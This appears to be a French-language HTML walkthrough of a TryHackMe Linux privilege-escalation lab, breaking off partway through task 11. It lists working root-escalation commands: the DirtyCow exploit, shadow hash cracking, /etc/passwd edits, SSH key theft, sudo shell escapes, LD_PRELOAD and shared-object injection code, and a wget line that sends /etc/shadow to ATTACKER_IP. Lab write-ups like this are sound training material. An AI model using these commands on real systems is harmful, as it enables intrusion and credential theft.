<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîê Linux PrivEsc Arena - Guide Complet</title>
    <link href="https://fonts.googleapis.com/css2?family=Crimson+Pro:wght@400;600;700&family=JetBrains+Mono:wght@400;600&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0e14;
            --bg-secondary: #151922;
            --bg-tertiary: #1f242e;
            --text-primary: #e6e8eb;
            --text-secondary: #9da3ae;
            --text-muted: #6b7280;
            --accent-1: #7dd3fc;
            --accent-2: #34d399;
            --accent-3: #fbbf24;
            --accent-danger: #f87171;
            --border-color: #2d3748;
            --code-bg: #1a1f2a;
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'DM Sans', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.7;
            overflow-x: hidden;
        }

        /* Background Effect */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(ellipse at 20% 30%, rgba(125, 211, 252, 0.05) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 70%, rgba(52, 211, 153, 0.05) 0%, transparent 50%);
            animation: float 30s ease-in-out infinite;
            pointer-events: none;
            z-index: -1;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(30px, -30px) rotate(5deg); }
            66% { transform: translate(-20px, 20px) rotate(-5deg); }
        }

        /* Header */
        header {
            background: var(--bg-secondary);
            border-bottom: 2px solid var(--border-color);
            padding: 2.5rem 2rem;
        }

        h1 {
            font-family: 'Crimson Pro', serif;
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent-1), var(--accent-2));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.5rem;
            letter-spacing: -0.02em;
        }

        .subtitle {
            color: var(--text-secondary);
            font-size: 1.1rem;
            font-weight: 400;
        }

        /* Navigation */
        nav {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            padding: 1.5rem 2rem;
            margin-bottom: 2rem;
        }

        nav h2 {
            color: var(--accent-1);
            font-size: 1.3rem;
            margin-bottom: 1rem;
            font-family: 'Crimson Pro', serif;
        }

        .nav-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 0.75rem;
        }

        .nav-link {
            color: var(--text-secondary);
            text-decoration: none;
            padding: 0.6rem 1rem;
            background: var(--bg-tertiary);
            border-radius: 6px;
            border: 1px solid var(--border-color);
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.95rem;
        }

        .nav-link:hover {
            background: var(--bg-primary);
            color: var(--accent-1);
            border-color: var(--accent-1);
            transform: translateX(5px);
        }

        .nav-link::before {
            content: '‚Üí';
            color: var(--accent-2);
            font-weight: bold;
        }

        /* Main Content */
        main {
            max-width: 1200px;
            margin: 0 auto;
            padding: 3rem 2rem;
        }

        /* Task Sections */
        .task {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 2.5rem;
            margin-bottom: 3rem;
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
        }

        .task::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, var(--accent-1), var(--accent-2));
        }

        .task h2 {
            font-family: 'Crimson Pro', serif;
            font-size: 2rem;
            color: var(--accent-1);
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .task h3 {
            color: var(--accent-2);
            font-size: 1.3rem;
            margin: 2rem 0 1rem 0;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .task h4 {
            color: var(--accent-3);
            font-size: 1.1rem;
            margin: 1.5rem 0 0.75rem 0;
        }

        .task p {
            color: var(--text-secondary);
            margin-bottom: 1rem;
            line-height: 1.8;
        }

        /* Code Blocks */
        pre {
            background: var(--code-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1.5rem;
            overflow-x: auto;
            margin: 1.5rem 0;
            position: relative;
        }

        code {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            color: var(--accent-1);
            line-height: 1.6;
        }

        pre code {
            color: var(--text-primary);
        }

        /* Inline Code */
        p code, li code, td code {
            background: var(--bg-tertiary);
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.85rem;
            color: var(--accent-1);
        }

        /* Lists */
        ul, ol {
            margin: 1rem 0 1rem 2rem;
            color: var(--text-secondary);
        }

        li {
            margin: 0.5rem 0;
            line-height: 1.7;
        }

        li::marker {
            color: var(--accent-2);
        }

        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0;
            background: var(--bg-tertiary);
            border-radius: 8px;
            overflow: hidden;
        }

        th {
            background: var(--bg-primary);
            color: var(--accent-1);
            padding: 1rem;
            text-align: left;
            font-weight: 600;
            border-bottom: 2px solid var(--accent-1);
        }

        td {
            padding: 1rem;
            border-bottom: 1px solid var(--border-color);
            color: var(--text-secondary);
        }

        tr:last-child td {
            border-bottom: none;
        }

        tr:hover {
            background: var(--bg-secondary);
        }

        /* Info Boxes */
        .info-box {
            background: var(--bg-tertiary);
            border-left: 4px solid var(--accent-2);
            padding: 1.5rem;
            margin: 1.5rem 0;
            border-radius: 8px;
        }

        .warning-box {
            background: var(--bg-tertiary);
            border-left: 4px solid var(--accent-danger);
            padding: 1.5rem;
            margin: 1.5rem 0;
            border-radius: 8px;
        }

        .success-box {
            background: var(--bg-tertiary);
            border-left: 4px solid var(--accent-2);
            padding: 1.5rem;
            margin: 1.5rem 0;
            border-radius: 8px;
        }

        /* Badges */
        .difficulty {
            display: inline-block;
            padding: 0.3rem 0.8rem;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-left: 1rem;
        }

        .diff-easy { background: rgba(52, 211, 153, 0.2); color: var(--accent-2); }
        .diff-medium { background: rgba(251, 191, 36, 0.2); color: var(--accent-3); }
        .diff-hard { background: rgba(248, 113, 113, 0.2); color: var(--accent-danger); }

        /* Footer */
        footer {
            background: var(--bg-secondary);
            border-top: 1px solid var(--border-color);
            padding: 2rem;
            text-align: center;
            color: var(--text-muted);
            margin-top: 4rem;
        }

        footer strong {
            color: var(--accent-1);
        }

        /* Scroll to Top */
        .scroll-top {
            position: fixed;
            bottom: 2rem;
            right: 2rem;
            background: var(--accent-1);
            color: var(--bg-primary);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 1.5rem;
            box-shadow: var(--shadow);
            transition: all 0.3s ease;
            opacity: 0;
            pointer-events: none;
        }

        .scroll-top.visible {
            opacity: 1;
            pointer-events: all;
        }

        .scroll-top:hover {
            transform: translateY(-5px);
            background: var(--accent-2);
        }

        /* Responsive */
        @media (max-width: 768px) {
            h1 { font-size: 2rem; }
            .task { padding: 1.5rem; }
            .nav-grid { grid-template-columns: 1fr; }
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .task {
            animation: fadeIn 0.5s ease-out;
        }
    </style>
</head>
<body>
    <header>
        <h1>üîê Linux PrivEsc Arena</h1>
        <p class="subtitle">Solutions Compl√®tes - Guide d'Escalade de Privil√®ges</p>
    </header>

    <nav>
        <h2>üìã Table des mati√®res</h2>
        <div class="nav-grid">
            <a href="#task-1" class="nav-link">Task 1 - Connexion</a>
            <a href="#task-2" class="nav-link">Task 2 - Deploy Machine</a>
            <a href="#task-3" class="nav-link">Task 3 - Kernel Exploits</a>
            <a href="#task-4" class="nav-link">Task 4 - Config Files</a>
            <a href="#task-5" class="nav-link">Task 5 - History</a>
            <a href="#task-6" class="nav-link">Task 6 - Weak Permissions</a>
            <a href="#task-7" class="nav-link">Task 7 - SSH Keys</a>
            <a href="#task-8" class="nav-link">Task 8 - Shell Escaping</a>
            <a href="#task-9" class="nav-link">Task 9 - Sudo Abuse</a>
            <a href="#task-10" class="nav-link">Task 10 - LD_PRELOAD</a>
            <a href="#task-11" class="nav-link">Task 11 - SO Injection</a>
            <a href="#task-12" class="nav-link">Task 12 - Symlinks</a>
            <a href="#task-13" class="nav-link">Task 13 - Env Variables #1</a>
            <a href="#task-14" class="nav-link">Task 14 - Env Variables #2</a>
            <a href="#task-15" class="nav-link">Task 15 - Capabilities</a>
            <a href="#task-16" class="nav-link">Task 16 - Cron Path</a>
            <a href="#task-17" class="nav-link">Task 17 - Cron Wildcards</a>
            <a href="#task-18" class="nav-link">Task 18 - Cron Overwrite</a>
            <a href="#task-19" class="nav-link">Task 19 - NFS Root Squash</a>
        </div>
    </nav>

    <main>
        <!-- Task 1 -->
        <section class="task" id="task-1">
            <h2>Task 1 - Connexion<span class="difficulty diff-easy">Facile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Se connecter au r√©seau TryHackMe via OpenVPN ou utiliser AttackBox.</p>
            
            <h3>üìù Commandes</h3>
            
            <h4>Option 1 : Via OpenVPN (depuis votre machine)</h4>
            <pre><code># T√©l√©charger votre fichier de configuration OpenVPN depuis TryHackMe
sudo openvpn votre-fichier.ovpn</code></pre>
            
            <h4>Option 2 : Utiliser AttackBox</h4>
            <pre><code># Cliquer sur le bouton "Start AttackBox" dans TryHackMe
# Pas de commande n√©cessaire</code></pre>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Aucune r√©ponse n√©cessaire - juste la connexion
            </div>
        </section>

        <!-- Task 2 -->
        <section class="task" id="task-2">
            <h2>Task 2 - Deploy the vulnerable machine<span class="difficulty diff-easy">Facile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>D√©ployer la machine vuln√©rable et se connecter en SSH.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># Une fois la machine d√©ploy√©e, attendre l'IP
# Se connecter en SSH avec les credentials fournis
ssh user@MACHINE_IP

# Username: user
# Password: password321</code></pre>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Aucune r√©ponse n√©cessaire - juste se connecter
            </div>
        </section>

        <!-- Task 3 -->
        <section class="task" id="task-3">
            <h2>Task 3 - Kernel Exploits<span class="difficulty diff-hard">Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter une vuln√©rabilit√© du kernel Linux pour obtenir root.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. V√©rifier la version du kernel
uname -a
# ou
cat /proc/version

# 2. Chercher l'exploit appropri√©
# La machine utilise Linux 2.6.x, vuln√©rable √† DirtyCow

# 3. T√©l√©charger l'exploit DirtyCow
cd /tmp
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c

# Ou utiliser l'exploit d√©j√† pr√©sent sur la machine
cd /home/user/tools/kernel-exploits/dirtycow

# 4. Compiler l'exploit
gcc -pthread dirty.c -o dirty -lcrypt

# 5. Ex√©cuter l'exploit
./dirty

# 6. Entrer un nouveau mot de passe quand demand√©
# Password: password

# 7. Se connecter avec le nouveau compte root
su firefart
# Password: password

# 8. V√©rifier que vous √™tes root
id
whoami</code></pre>
            
            <div class="info-box">
                <h4>üîç D√©tails techniques</h4>
                <ul>
                    <li><strong>Vuln√©rabilit√©:</strong> CVE-2016-5195 (Dirty COW)</li>
                    <li><strong>Kernel affect√©:</strong> Linux Kernel 2.6.22 &lt; 3.9</li>
                    <li><strong>Principe:</strong> Race condition dans la gestion de la m√©moire (Copy-On-Write)</li>
                </ul>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                La r√©ponse d√©pend de la question pos√©e, g√©n√©ralement le flag se trouve dans <code>/root/flag.txt</code>
                <pre><code>cat /root/flag.txt</code></pre>
            </div>
        </section>

        <!-- Task 4 -->
        <section class="task" id="task-4">
            <h2>Task 4 - Stored Passwords (Config Files)<span class="difficulty diff-easy">Facile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Trouver des mots de passe stock√©s dans des fichiers de configuration.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Chercher des fichiers de configuration avec des mots de passe
cat /home/user/myvpn.ovpn
# ou
grep -r "password" /home/user/ 2>/dev/null

# 2. Chercher dans les fichiers de configuration communs
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.bash_history
cat ~/.*history

# 3. Chercher dans les fichiers de configuration syst√®me
ls -la /etc/ | grep -i conf
cat /etc/openvpn/auth.txt  # Souvent utilis√© pour VPN

# 4. Chercher dans les scripts
find /home -name "*.sh" -exec grep -i "password\|pass" {} \; 2>/dev/null

# 5. Une fois le mot de passe root trouv√©
su root
# Password: password123 (ou celui trouv√©)

# 6. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Lieux communs pour les mots de passe</h4>
                <pre><code># Fichiers de configuration VPN
/home/user/myvpn.ovpn
/etc/openvpn/auth.txt

# Fichiers de configuration
~/.bashrc
~/.profile
~/.bash_profile

# Scripts personnalis√©s
/home/user/*.sh
/usr/local/bin/*.sh

# Fichiers de configuration d'applications
~/.config/
~/.ssh/config</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Le mot de passe root trouv√© dans le fichier de configuration
            </div>
        </section>

        <!-- Task 5 -->
        <section class="task" id="task-5">
            <h2>Task 5 - Stored Passwords (History)<span class="difficulty diff-easy">Facile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Trouver des mots de passe dans l'historique des commandes.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. V√©rifier l'historique bash
cat ~/.bash_history

# 2. Chercher sp√©cifiquement des commandes avec des mots de passe
cat ~/.bash_history | grep -i "password\|passwd\|pwd"

# 3. V√©rifier d'autres historiques
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.nano_history

# 4. Chercher dans l'historique de tous les utilisateurs (si possible)
cat /home/*/.bash_history 2>/dev/null | grep -i "password"

# 5. Chercher des commandes MySQL avec mot de passe
cat ~/.mysql_history | grep -i "password"

# Exemple de ce qu'on peut trouver :
# mysql -h somehost.local -uroot -ppassword123

# 6. Utiliser le mot de passe trouv√©
su root
# Password: password123

# 7. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Commandes dangereuses √† chercher dans l'historique</h4>
                <pre><code># MySQL
mysql -u root -pPASSWORD
mysql --password=PASSWORD

# SSH
sshpass -p 'PASSWORD' ssh user@host

# FTP
ftp user:PASSWORD@host

# Curl/Wget avec auth
curl -u user:PASSWORD http://site

# Variables d'environnement
export PASSWORD=secret</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Le mot de passe trouv√© dans l'historique des commandes
            </div>
        </section>

        <!-- Task 6 -->
        <section class="task" id="task-6">
            <h2>Task 6 - Weak File Permissions<span class="difficulty diff-medium">Moyen</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter les permissions faibles sur <code>/etc/shadow</code> ou <code>/etc/passwd</code>.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. V√©rifier les permissions de /etc/shadow
ls -la /etc/shadow

# Si le fichier est lisible (permissions 644 au lieu de 640)
# 2. Lire /etc/shadow
cat /etc/shadow

# 3. Extraire le hash du mot de passe root
cat /etc/shadow | grep root

# 4. Copier le hash dans un fichier
echo 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::' > hash.txt

# 5. Utiliser john pour cracker le hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# ou hashcat
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

# M√âTHODE 2 : Si /etc/passwd est modifiable
# 6. V√©rifier les permissions de /etc/passwd
ls -la /etc/passwd

# Si le fichier est modifiable (permissions 666 au lieu de 644)
# 7. G√©n√©rer un nouveau hash de mot de passe
openssl passwd -1 -salt xyz password123
# R√©sultat: $1$xyz$F3QzWGa8D0rEJBiOC8kNm0

# 8. Modifier /etc/passwd pour changer le mot de passe root
# Remplacer le 'x' dans la ligne root par le hash g√©n√©r√©
nano /etc/passwd
# Avant: root:x:0:0:root:/root:/bin/bash
# Apr√®s:  root:$1$xyz$F3QzWGa8D0rEJBiOC8kNm0:0:0:root:/root:/bin/bash

# 9. Se connecter en tant que root
su root
# Password: password123

# 10. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Permissions normales vs vuln√©rables</h4>
                <p><strong>Permissions normales :</strong></p>
                <pre><code>-rw-r----- 1 root shadow /etc/shadow  # Correct
-rw-r--r-- 1 root root   /etc/passwd  # Correct</code></pre>
                
                <p><strong>Permissions vuln√©rables :</strong></p>
                <pre><code>-rw-r--r-- 1 root root /etc/shadow    # VULN√âRABLE (644)
-rw-rw-rw- 1 root root /etc/passwd    # VULN√âRABLE (666)</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Le mot de passe root crack√© ou le flag apr√®s modification de /etc/passwd
            </div>
        </section>

        <!-- Task 7 -->
        <section class="task" id="task-7">
            <h2>Task 7 - SSH Keys<span class="difficulty diff-medium">Moyen</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Utiliser des cl√©s SSH mal prot√©g√©es pour obtenir un acc√®s root.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Chercher des cl√©s SSH priv√©es
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 2. Chercher dans les r√©pertoires communs
ls -la ~/.ssh/
ls -la /root/.ssh/
ls -la /home/*/.ssh/

# 3. Chercher des cl√©s SSH lisibles
find / -name id_rsa 2>/dev/null -exec ls -la {} \;

# 4. Si une cl√© root est trouv√©e et lisible
cat /home/user/.ssh/id_rsa  # ou autre chemin

# 5. Copier la cl√© sur votre machine
# Sur la machine cible:
cat /home/user/.ssh/id_rsa

# Sur votre AttackBox:
nano root_key
# Coller la cl√©
chmod 600 root_key

# 6. Se connecter avec la cl√©
ssh -i root_key root@MACHINE_IP

# M√âTHODE 2 : Ajouter votre propre cl√©
# 7. Si /root/.ssh/authorized_keys est modifiable
# G√©n√©rer une paire de cl√©s sur votre machine
ssh-keygen -f mykey

# 8. Ajouter votre cl√© publique
echo "VOTRE_CLE_PUBLIQUE" >> /root/.ssh/authorized_keys

# 9. Se connecter
ssh -i mykey root@MACHINE_IP

# 10. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Chemins communs pour les cl√©s SSH</h4>
                <pre><code># Cl√©s priv√©es
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/root/.ssh/id_rsa
/home/*/.ssh/id_rsa

# Cl√©s publiques autoris√©es
~/.ssh/authorized_keys
/root/.ssh/authorized_keys

# Fichiers de configuration
~/.ssh/config
~/.ssh/known_hosts</code></pre>
                
                <h4>Permissions correctes</h4>
                <pre><code>drwx------ (700) ~/.ssh/
-rw------- (600) id_rsa       # Cl√© priv√©e
-rw-r--r-- (644) id_rsa.pub   # Cl√© publique
-rw-r--r-- (644) authorized_keys</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Connexion r√©ussie en tant que root via SSH
            </div>
        </section>

        <!-- Task 8 -->
        <section class="task" id="task-8">
            <h2>Task 8 - Sudo (Shell Escaping)<span class="difficulty diff-medium">Moyen</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter les binaires autoris√©s en sudo pour obtenir un shell root.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. V√©rifier les privil√®ges sudo
sudo -l

# Exemple de sortie:
# User user may run the following commands on this host:
#     (root) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/find
#     (root) NOPASSWD: /usr/bin/nano
#     (root) NOPASSWD: /usr/bin/awk

# 2. Utiliser GTFOBins pour trouver l'exploit
# https://gtfobins.github.io/

# M√âTHODE VIM
sudo vim -c ':!/bin/bash'
# ou
sudo vim
# Puis taper: :!/bin/bash
# ou: :set shell=/bin/bash
#     :shell

# M√âTHODE FIND
sudo find /home -exec /bin/bash \;
# ou
sudo find . -exec /bin/sh -i \;

# M√âTHODE AWK
sudo awk 'BEGIN {system("/bin/bash")}'

# M√âTHODE NANO
sudo nano
# Ctrl+R Ctrl+X
# reset; sh 1>&0 2>&0

# M√âTHODE LESS
sudo less /etc/profile
# Puis taper: !/bin/bash

# M√âTHODE MORE
sudo more /etc/profile
# Puis taper: !/bin/bash

# M√âTHODE MAN
sudo man man
# Puis taper: !/bin/bash

# M√âTHODE VI
sudo vi
# :set shell=/bin/bash
# :shell

# M√âTHODE NMAP (versions anciennes)
sudo nmap --interactive
nmap> !sh

# M√âTHODE PERL
sudo perl -e 'exec "/bin/bash";'

# M√âTHODE PYTHON
sudo python -c 'import os; os.system("/bin/bash")'

# M√âTHODE RUBY
sudo ruby -e 'exec "/bin/bash"'

# 3. V√©rifier que vous √™tes root
id
whoami

# 4. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Binaires communs exploitables</h4>
                <table>
                    <thead>
                        <tr>
                            <th>Binaire</th>
                            <th>Commande d'exploitation</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>vim/vi</td>
                            <td><code>sudo vim -c ':!/bin/bash'</code></td>
                        </tr>
                        <tr>
                            <td>nano</td>
                            <td>Ctrl+R Ctrl+X puis <code>reset; sh 1>&0 2>&0</code></td>
                        </tr>
                        <tr>
                            <td>less</td>
                            <td><code>sudo less /etc/profile</code> puis <code>!/bin/bash</code></td>
                        </tr>
                        <tr>
                            <td>more</td>
                            <td><code>sudo more /etc/profile</code> puis <code>!/bin/bash</code></td>
                        </tr>
                        <tr>
                            <td>man</td>
                            <td><code>sudo man man</code> puis <code>!/bin/bash</code></td>
                        </tr>
                        <tr>
                            <td>find</td>
                            <td><code>sudo find . -exec /bin/sh \;</code></td>
                        </tr>
                        <tr>
                            <td>awk</td>
                            <td><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></td>
                        </tr>
                        <tr>
                            <td>perl</td>
                            <td><code>sudo perl -e 'exec "/bin/sh";'</code></td>
                        </tr>
                        <tr>
                            <td>python</td>
                            <td><code>sudo python -c 'import os; os.system("/bin/sh")'</code></td>
                        </tr>
                        <tr>
                            <td>nmap</td>
                            <td><code>sudo nmap --interactive</code> puis <code>!sh</code></td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via escape de commande sudo
            </div>
        </section>

        <!-- Task 9 -->
        <section class="task" id="task-9">
            <h2>Task 9 - Sudo (Abusing Intended Functionality)<span class="difficulty diff-hard">Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Abuser de la fonctionnalit√© intentionnelle d'un programme autoris√© en sudo.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. V√©rifier les privil√®ges sudo
sudo -l

# Exemple: (root) NOPASSWD: /usr/bin/apache2

# M√âTHODE APACHE2
# 2. Apache2 peut lire n'importe quel fichier
sudo apache2 -f /etc/shadow
# Erreur affich√©e avec le contenu de /etc/shadow

# M√âTHODE WGET
# Si wget est autoris√© en sudo
# 3. Utiliser wget pour lire des fichiers
sudo wget -i /etc/shadow

# Ou exfiltrer des fichiers
sudo wget --post-file=/etc/shadow http://ATTACKER_IP:8000/

# M√âTHODE TAR
# Si tar est autoris√© en sudo
# 4. Cr√©er une archive avec des fichiers sensibles
sudo tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar

# Ou utiliser tar avec checkpoint pour ex√©cuter des commandes
echo "/bin/bash" > /tmp/shell.sh
chmod +x /tmp/shell.sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/shell.sh

# M√âTHODE ZIP
# Si zip est autoris√©
# 5. Zipper et lire des fichiers
sudo zip /tmp/test.zip /etc/shadow
unzip -p /tmp/test.zip

# M√âTHODE RSYNC
# Si rsync est autoris√©
# 6. Utiliser rsync pour copier des fichiers
sudo rsync -av /root/ /tmp/root_backup/
ls -la /tmp/root_backup/

# M√âTHODE GIT
# Si git est autoris√©
# 7. Git peut lire des fichiers
sudo git diff /dev/null /etc/shadow

# 9. Lire le flag ou obtenir root
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Abus de fonctionnalit√©s courantes</h4>
                <p><strong>Apache2 :</strong></p>
                <ul>
                    <li>Lit les fichiers de configuration (peut lire n'importe quel fichier)</li>
                    <li>Affiche les erreurs avec le contenu</li>
                </ul>
                
                <p><strong>Wget :</strong></p>
                <ul>
                    <li>Peut lire des fichiers avec <code>-i</code></li>
                    <li>Peut exfiltrer avec <code>--post-file</code></li>
                </ul>
                
                <p><strong>Tar :</strong></p>
                <ul>
                    <li>Peut archiver n'importe quel fichier</li>
                    <li><code>--checkpoint-action</code> peut ex√©cuter des commandes</li>
                </ul>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Acc√®s aux fichiers sensibles ou shell root obtenu
            </div>
        </section>

        <!-- Task 10 -->
        <section class="task" id="task-10">
            <h2>Task 10 - Sudo (LD_PRELOAD)<span class="difficulty diff-hard">Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter la variable d'environnement LD_PRELOAD avec sudo.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. V√©rifier si LD_PRELOAD est pr√©serv√© dans sudo
sudo -l

# Chercher la ligne: env_keep+=LD_PRELOAD

# 2. Cr√©er une biblioth√®que malveillante
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 3. Compiler la biblioth√®que
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 4. Ex√©cuter n'importe quelle commande sudo avec LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so find

# Ou avec un programme autoris√©:
sudo LD_PRELOAD=/tmp/shell.so apache2

# 5. V√©rifier que vous √™tes root
id
whoami

# 6. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Explication technique</h4>
                <p><strong>LD_PRELOAD :</strong></p>
                <ul>
                    <li>Variable d'environnement qui sp√©cifie des biblioth√®ques √† charger avant toutes les autres</li>
                    <li>Permet de remplacer des fonctions de biblioth√®ques standard</li>
                    <li>Normalement supprim√©e par sudo pour la s√©curit√©</li>
                </ul>
                
                <p><strong>env_keep+=LD_PRELOAD :</strong></p>
                <ul>
                    <li>Configuration sudo qui pr√©serve LD_PRELOAD</li>
                    <li>Permet l'exploitation</li>
                </ul>
                
                <p><strong>Fonctionnement de l'exploit :</strong></p>
                <ol>
                    <li>On cr√©e une biblioth√®que (.so) avec une fonction <code>_init()</code></li>
                    <li>Cette fonction est ex√©cut√©e au chargement de la biblioth√®que</li>
                    <li>Elle spawn un shell avec les privil√®ges du programme (root)</li>
                </ol>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via LD_PRELOAD
            </div>
        </section>

        <!-- Task 11 -->
        <section class="task" id="task-11">
            <h2>Task 11 - SUID (Shared Object Injection)<span class="difficulty diff-hard">Tr√®s Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter un binaire SUID qui charge une biblioth√®que partag√©e depuis un chemin accessible en √©criture.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Trouver les binaires SUID
find / -type f -perm -04000 -ls 2>/dev/null

# 2. Chercher un binaire SUID custom (souvent /usr/local/bin/suid-so)
ls -la /usr/local/bin/suid-so

# 3. V√©rifier les biblioth√®ques charg√©es avec strace
strace /usr/local/bin/suid-so 2>&1 | grep -i "open\|access\|no such file"

# Chercher des lignes comme:
# open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

# 4. Cr√©er le r√©pertoire si n√©cessaire
mkdir -p /home/user/.config

# 5. Cr√©er une biblioth√®que malveillante
cat > /tmp/libcalc.c << EOF
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 6. Compiler la biblioth√®que
gcc -shared -fPIC -o /home/user/.config/libcalc.so /tmp/libcalc.c

# 7. Ex√©cuter le binaire SUID
/usr/local/bin/suid-so

# 8. V√©rifier que vous √™tes root
id
whoami

# 9. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Outils pour l'analyse</h4>
                <p><strong>strace :</strong></p>
                <pre><code># Tracer les appels syst√®me
strace /path/to/binary 2>&1 | grep ".so"

# Chercher sp√©cifiquement les fichiers non trouv√©s
strace /path/to/binary 2>&1 | grep "ENOENT"</code></pre>
                
                <p><strong>ldd :</strong></p>
                <pre><code># Lister les biblioth√®ques partag√©es
ldd /path/to/binary

# Exemple de sortie vuln√©rable:
